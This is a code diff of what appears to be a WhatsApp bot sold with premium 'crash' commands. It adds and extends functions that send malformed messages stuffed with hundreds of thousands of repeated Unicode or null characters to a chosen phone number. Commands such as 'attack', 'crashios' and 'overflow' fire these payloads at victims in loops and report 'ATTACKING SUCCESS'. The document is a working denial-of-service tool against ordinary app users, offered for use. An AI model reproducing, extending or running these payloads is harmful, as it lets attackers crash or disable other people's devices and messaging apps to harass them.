@@ -422,6 +422,64 @@ const wanted = {
                 console.log(err);
             }
         }
+        
+async function buginvite(target, ptcp = true) {
+    try {
+        const message = {
+            botInvokeMessage: {
+                message: {
+                    newsletterAdminInviteMessage: {
+                        newsletterJid: `33333333333333333@newsletter`,
+                        newsletterName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(120000),
+                        jpegThumbnail: "",
+                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
+                        inviteExpiration: Date.now() + 1814400000, // 21 hari
+                    },
+                },
+            },
+            nativeFlowMessage: {
+    messageParamsJson: "",
+    buttons: [
+        {
+            name: "call_permission_request",
+            buttonParamsJson: "{}",
+        },
+        {
+            name: "galaxy_message",
+            paramsJson: {
+                "screen_2_OptIn_0": true,
+                "screen_2_OptIn_1": true,
+                "screen_1_Dropdown_0": "nullOnTop",
+                "screen_1_DatePicker_1": "1028995200000",
+                "screen_1_TextInput_2": "null@gmail.com",
+                "screen_1_TextInput_3": "94643116",
+                "screen_0_TextInput_0": "\u0000".repeat(500000),
+                "screen_0_TextInput_1": "SecretDocu",
+                "screen_0_Dropdown_2": "#926-Xnull",
+                "screen_0_RadioButtonsGroup_3": "0_true",
+                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
+            },
+        },
+    ],
+},
+                     contextInfo: {
+                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                groupMentions: [
+                    {
+                        groupJid: "0@s.whatsapp.net",
+                        groupSubject: "viperwzz",
+                    },
+                ],
+            },
+        };
+
+        await viper.relayMessage(target, message, {
+            userJid: target,
+        });
+    } catch (err) {
+        console.error("Error sending newsletter:", err);
+    }
+}
 		
 async function XeonXRobust(target, Ptcp = true) {
 	const jids = `*_~@13135550002~_*\n`.repeat(10000);
@@ -545,7 +603,7 @@ quotedMessage: {
                     footerText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
                     buttons: [
                         {
-                            buttonId: "\u0003".repeat(150000),
+                            buttonId: "\u0003".repeat(180000),
                             buttonText: {
                                 displayText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
                             },
@@ -2150,15 +2208,15 @@ sendQP(target, wanted);
 await sleep(1500);
 await sendQP(target, wanted);
 await sleep(1500);
-await beta2(viper, target, (cct = true), (Ptcp = true));
+await XeonXRobustV2(viper, target, (cct = true), (Ptcp = true));
 await sleep(1500);
-await beta2(viper, target)
+await XeonXRobustV2(viper, target)
 await sleep(1500);
 await sendSessionStructure(target, wanted);
 await sleep(1500);
-await beta1(viper, target);
+await XeonXRobust(viper, target);
 await sleep(1500);
-await beta1(viper, target);
+await XeonXRobust(viper, target);
 darkphonk = fs.readFileSync('./database/suki.mp3')
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
@@ -2172,8 +2230,8 @@ case 'fuck': case 'tzy':
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(target);
+XReturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+var contactInfo = await viper.onWhatsApp(XReturn);
   if (victim == "6283809358811") {
     return;
     }
@@ -2187,27 +2245,27 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, (cct = true), (Ptcp = true));
+await buk1(viper, XReturn, (cct = true), (Ptcp = true));
 await sleep(1500);
-await buk1(viper, target);
+await buk1(viper, XReturn);
 await sleep(1500);
-sendQP(target, wanted);
+sendQP(XReturn, wanted);
 await sleep(1500);
-await sendQP(target, wanted);
+await sendQP(XReturn, wanted);
 await sleep(1500);
-await beta2(viper, target, (cct = true), (Ptcp = true));
+await XeonXRobustV2(viper, XReturn, (cct = true), (Ptcp = true));
 await sleep(1500);
-await beta2(viper, target)
+await XeonXRobustV2(viper, XReturn)
 await sleep(1500);
-await sendSessionStructure(target, wanted);
+await sendSessionStructure(XReturn, wanted);
 await sleep(1500);
-await beta1(viper, target);
+await XeonXRobust(viper, XReturn);
 await sleep(1500);
-await beta1(viper, target);
+await XeonXRobust(viper, XReturn);
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
-𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+𝐓𝐀𝐑𝐆𝐄𝐓 : ${XReturn}
 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
 
     𝐍𝐎𝐓𝐄
@@ -2218,8 +2276,8 @@ case 'vip': case 'attack': case 'andro':
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(target);
+XReturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+var contactInfo = await viper.onWhatsApp(XReturn);
   if (victim == "6283809358811") {
     return;
     }
@@ -2233,27 +2291,27 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, (cct = true), (Ptcp = true));
+await buk1(viper, XReturn, (cct = true), (Ptcp = true));
 await sleep(1500);
-await buk1(viper, target);
+await buk1(viper, XReturn);
 await sleep(1500);
-sendQP(target, wanted);
+sendQP(XReturn, wanted);
 await sleep(1500);
-await sendQP(target, wanted);
+await sendQP(XReturn, wanted);
 await sleep(1500);
-await beta2(viper, target, (cct = true), (Ptcp = true));
+await XeonXRobustV2(viper, XReturn, (cct = true), (Ptcp = true));
 await sleep(1500);
-await beta2(viper, target)
+await XeonXRobustV2(viper, XReturn)
 await sleep(1500);
-await sendSessionStructure(target, wanted);
+await sendSessionStructure(XReturn, wanted);
 await sleep(1500);
-await beta1(viper, target);
+await XeonXRobust(viper, XReturn);
 await sleep(1500);
-await beta1(viper, target);
+await XeonXRobust(viper, XReturn);
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
-𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+𝐓𝐀𝐑𝐆𝐄𝐓 : ${XReturn}
 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
 
     𝐍𝐎𝐓𝐄
@@ -2264,8 +2322,8 @@ case 'crashios': case 'ios': case 'trashios':
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(target);
+XReturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+var contactInfo = await viper.onWhatsApp(XReturn);
   if (victim == "6283809358811") {
     return;
     }
@@ -2279,15 +2337,15 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, "Punten", 1020000, Ptcp = true);
-await sendQP(target, wanted)
-await beta2(viper, target, wanted)
-await sendSessionStructure(target, wanted)
-await beta1(viper, target, wanted)
+await buk1(viper, XReturn, "Punten", 1020000, Ptcp = true);
+await sendQP(XReturn, wanted)
+await XeonXRobustV2(viper, XReturn, wanted)
+await sendSessionStructure(XReturn, wanted)
+await XeonXRobust(viper, XReturn, wanted)
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
-𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+𝐓𝐀𝐑𝐆𝐄𝐓 : ${XReturn}
 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
 
     𝐍𝐎𝐓𝐄
@@ -2298,8 +2356,8 @@ case 'overflow': case 'vipercrash': case 'crashflow':
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(target);
+XReturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+var contactInfo = await viper.onWhatsApp(XReturn);
   if (victim == "6283809358811") {
     return;
     }
@@ -2313,27 +2371,27 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, (cct = true), (Ptcp = true));
+await buk1(viper, XReturn, (cct = true), (Ptcp = true));
 await sleep(1500);
-await buk1(viper, target);
+await buk1(viper, XReturn);
 await sleep(1500);
-sendQP(target, wanted);
+sendQP(XReturn, wanted);
 await sleep(1500);
-await sendQP(target, wanted);
+await sendQP(XReturn, wanted);
 await sleep(1500);
-await beta2(viper, target, (cct = true), (Ptcp = true));
+await XeonXRobustV2(viper, XReturn, (cct = true), (Ptcp = true));
 await sleep(1500);
-await beta2(viper, target)
+await XeonXRobustV2(viper, XReturn)
 await sleep(1500);
-await sendSessionStructure(target, wanted);
+await sendSessionStructure(XReturn, wanted);
 await sleep(1500);
-await beta1(viper, target);
+await XeonXRobust(viper, XReturn);
 await sleep(1500);
-await beta1(viper, target);
+await XeonXRobust(viper, XReturn);
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
-𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+𝐓𝐀𝐑𝐆𝐄𝐓 : ${XReturn}
 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
 
     𝐍𝐎𝐓𝐄
@@ -2344,8 +2402,8 @@ case 'xeon':
 if (!isPremium) return reply(mess.only.premium)
 	if (!q) return reply(`Example:\n ${prefix + command} 91xxx`)
 victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(target);
+XReturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+var contactInfo = await viper.onWhatsApp(XReturn);
   if (victim == "6283809358811") {
     return;
     }
@@ -2359,16 +2417,16 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(`In process`)
 	await sleep(3000)
 for (let i = 0; i < 10; i++) {
-    await XeonXRobustV2(viper, target)
+    await XeonXRobustV2(viper, XReturn)
     await sleep(2000)
-    await XeonXRobust(target, viper, (cct = true), (Ptcp = true));
+    await XeonXRobust(XReturn, viper, (cct = true), (Ptcp = true));
     await sleep(2000)
-    await XeonXRobustV2(viper, target)
+    await XeonXRobustV2(viper, XReturn)
     }
 	sendMessageWithMentions(
-    "Successfully Sent Bug To @" + target.split('@')[0] + 
+    "Successfully Sent Bug To @" + XReturn.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
-    [target]
+    [XReturn]
   );
 break;
 
@@ -2735,8 +2793,8 @@ case 'xvip': {
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(target);
+XReturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+var contactInfo = await viper.onWhatsApp(XReturn);
   if (victim == "6283809358811") {
     return;
     }
@@ -2752,21 +2810,21 @@ var contactInfo = await viper.onWhatsApp(target);
 						highlight_label: "⚜️⃟ ⌁⃰𝐕𝐢𝐩𝐞͢𝐫ཀ͜͡💫",
 						rows: [{
 							title: '⌁⃰𝐕𝐢𝐩𝐞𝐫͢ 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧',
-							id: `vip ${target}`
+							id: `vip ${XReturn}`
 						}]
 					},
 					{
 						highlight_label: "🔴⃟⌁⃰𝐙𝐫͢𝐧𝟏 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡💫",
 						rows: [{
 							title: '⌁⃰𝐙𝐫͢𝐧𝟏',
-							id: `andro ${target}`
+							id: `andro ${XReturn}`
 						}]
 					},
 					{
 						highlight_label: "🔵⃟⌁⃰𝐙𝐫͢𝐧𝟐 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡💫",
 						rows: [{
 							title: '⌁⃰𝐙𝐫͢𝐧𝟐',
-							id: `xbeta ${target}`
+							id: `xbeta ${XReturn}`
 						}]
 					},
 					{
@@ -2774,21 +2832,21 @@ var contactInfo = await viper.onWhatsApp(target);
 						highlight_label: "🚫⃟ ⌁⃰𝐀𝐩𝐩𝐥𝐞͢ཀ͜͡💫",
 						rows: [{
 							title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡 𝐥͢𝐨ͮ𝐬༑',
-							id: `crashios ${target}`
+							id: `crashios ${XReturn}`
 						}]
 					},
 					{
 						highlight_label: "⛔️⃟ ⌁⃰𝐀𝐩𝐩𝐥𝐞͢ཀ͜͡💫",
 						rows: [{
 							title: '⌁⃰𝐕𝐢𝐩𝐞𝐫͢ 𝐈𝐨ͮ͢𝐒༑',
-							id: `ios ${target}`
+							id: `ios ${XReturn}`
 						}]
 					},
 					{
 						highlight_label: "🟡⃟ ⌁⃰𝐀𝐩𝐩𝐥𝐞͢ཀ͜͡💫",
 						rows: [{
 							title: '⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
-							id: `trashios ${target}`
+							id: `trashios ${XReturn}`
 						}]
 					},
 					{
@@ -2796,21 +2854,21 @@ var contactInfo = await viper.onWhatsApp(target);
 						highlight_label: "🚯⃟⌁⃰𝐙𝐫͢𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡💫",
 						rows: [{
 							title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑',
-							id: `crashflow ${target}`
+							id: `crashflow ${XReturn}`
 						}]
 					},
 					{
 						highlight_label: "🙂‍↔️⃟ ⌁⃰𝐕𝐢𝐩𝐞͢𝐫ཀ͜͡💫",
 						rows: [{
 							title: '⌁⃰𝐕𝐢𝐩𝐞͢𝐫 𝐂͢𝐫𝐚ͯ𝐬͢𝐡',
-							id: `xeon ${target}`
+							id: `xeon ${XReturn}`
 						}]
 					},
 					{
 						highlight_label: "☢️⃟⌁⃰𝐙𝐫͢𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡💫",
 						rows: [{
 							title: '⌁⃰𝚯𝐯ͯ͢𝐞𝐫ͮ𝐅𝐥͢𝐨ͯ𝐰༑',
-							id: `overflow ${target}`
+							id: `overflow ${XReturn}`
 						}]
 					}]
 let listMessage = {
@@ -2837,7 +2895,7 @@ let msg = generateWAMessageFromContent(m.chat, {
  businessMessageForwardInfo: { businessOwnerJid: viper.decodeJid(viper.user.id) },
  }, 
  body: proto.Message.InteractiveMessage.Body.create({
- text: (`𝐀𝐓𝐓𝐀𝐂𝐊 : ${target}`)
+ text: (`𝐀𝐓𝐓𝐀𝐂𝐊 : ${XReturn}`)
  }),
  footer: proto.Message.InteractiveMessage.Footer.create({
  text: ``
